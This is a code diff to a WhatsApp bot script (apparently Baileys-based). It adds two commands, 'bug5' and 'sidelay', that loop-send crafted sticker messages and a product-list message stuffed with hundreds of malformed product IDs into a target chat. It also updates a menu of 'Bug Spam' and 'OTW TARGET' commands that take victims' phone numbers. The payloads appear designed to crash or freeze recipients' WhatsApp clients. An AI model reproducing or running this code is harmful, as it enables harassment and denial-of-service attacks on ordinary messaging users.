@@ -750,6 +750,1343 @@ haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 }
 }
 break
+case 'bug5': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
+"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
+"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
+"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
+"mimetype": "image/webp",
+"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
+"fileLength": "14240",
+"mediaKeyTimestamp": "1664991742",
+"isAnimated": false,
+}
+}), { userJid: m.chat, quoted: doc })
+haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
+}
+}
+break
+
+case 'sidelay': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+var bugshinchan = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"listMessage": {
+"title": `${buttonkal}`,
+"description": `HW MODS WA${buttonkal}`,
+"buttonText": "",
+"listType": "PRODUCT_LIST",
+"productListInfo": {
+"productSections": [
+{
+"title": `HW MODS WA ${buttonkal}`,
+	"products": [
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216262"
+										},
+										{
+											"productId": "1847261837216262244"
+										},
+										{
+											"productId": "184726183721626282"
+										},
+										{
+											"productId": "1847261837216262829"
+										},
+										{
+											"productId": "1847261837216262829"
+										},
+										{
+											"productId": "1847261837216262824"
+										},
+										{
+											"productId": "184726183721626282"
+										},
+										{
+											"productId": "184726183721626282"
+										},
+										{
+											"productId": "184726183721626282"
+										},
+										{
+											"productId": "18472618372162628"
+										},
+										{
+											"productId": "18472618372162628"
+										},
+										{
+											"productId": "1847261837216262"
+										},
+										{
+											"productId": "1847261837216262"
+										},
+										{
+											"productId": "18472618372162627"
+										},
+										{
+											"productId": "1847261837216262"
+										},
+										{
+											"productId": "1847261837216262"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216262"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216269"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216262"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "1847261837216262829"
+										},
+										{
+											"productId": "1847261837216262824"
+										},
+										{
+											"productId": "184726183721626282"
+										},
+										{
+											"productId": "184726183721626282"
+										},
+										{
+											"productId": "184726183721626282"
+										},
+										{
+											"productId": "18472618372162628"
+										},
+										{
+											"productId": "18472618372162628"
+										},
+										{
+											"productId": "1847261837216262"
+										},
+										{
+											"productId": "1847261837216262"
+										},
+										{
+											"productId": "18472618372162627"
+										},
+										{
+											"productId": "1847261837216262"
+										},
+										{
+											"productId": "1847261837216262"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										},
+										{
+											"productId": "184726183721626"
+										}
+									]
+}
+],
+"headerImage": {
+"productId": "7007318245952499",
+"jpegThumbnail": virgam,
+},
+"businessOwnerJid": "6281214281312@s.whatsapp.net",
+},
+"footerText": `${buttonkal}`,
+}
+}), { userJid: m.chat, quoted: doc })
+haikal.relayMessage(m.chat, bugshinchan.message, { messageId: bugshinchan.key.id })
+}
+}
+break
 //=================================================//
 case 'bug6': {
 if (!isCreator) return
@@ -4234,7 +5571,7 @@ jadikatalog [ reply sticker ] jumlah
 
 ° OTW TARGET °
 
-🔥 628xxx|5|5
+🔥 628xxx|5|5 #Update Baileys
 ampas1 628xxx
 santetdia 628xxx@s.whatsapp.net|10|10s
 catalogpc 628xxx@s.whatsapp.net|10|10s
@@ -4262,7 +5599,9 @@ virtext10 [ jumlah ]
 
 ° Bug Spam °
 
-🌷 [ jumlah ]
+🌷 [ jumlah ] #Update Baileys
+
+sidelay [ jumlah ]
 bugstik [ jumlah ]
 bugie [ jumlah ]
 buglokas [ jumlah ]
